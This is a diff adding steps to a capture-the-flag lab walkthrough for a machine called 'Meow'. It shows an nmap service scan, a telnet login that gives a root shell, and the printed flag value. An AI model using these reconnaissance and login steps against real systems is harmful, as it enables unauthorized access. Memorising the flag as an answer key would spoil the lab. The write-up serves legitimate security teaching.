@@ -27,7 +27,29 @@
 
 ---
 ## Flag:
-Get the flag via telnet:
+First, we need to scan the target with `nmap`.
+
+Command:
+`nmap -n -sC -sV 10.129.80.87`
+`-n`: No DNS look up (Good [OPSEC](https://en.wikipedia.org/wiki/Operations_security)).
+`-sC`: Run scripts during scan.
+`-sV`: Try to detect the version of running services.
+
+```console
+┌──(kali㉿kali)-[~]
+└─$ nmap -n -sC -sV 10.129.80.87                  
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-15 13:17 EDT
+Nmap scan report for 10.129.80.87
+Host is up (0.070s latency).
+Not shown: 999 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+23/tcp open  telnet  Linux telnetd
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+The machine is running telnet on port 23.
+
+Telnet: `telnet 10.129.80.87`
 
 ```console
 ┌──(kali㉿kali)-[~/Downloads]
@@ -73,8 +95,18 @@ The list of available updates is more than a week old.
 To check for new updates run: sudo apt update
 
 Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0
+```
+
+We are connected! To see what files are in the current directory we can use `ls`.
+
+```
 root@Meow:~# ls
 flag.txt  snap
+```
+
+And to see what a file contains we can use `cat`.
+
+```
 root@Meow:~# cat flag.txt 
 b40abdfe23665f766f9c61ecba8a4c19
 ```
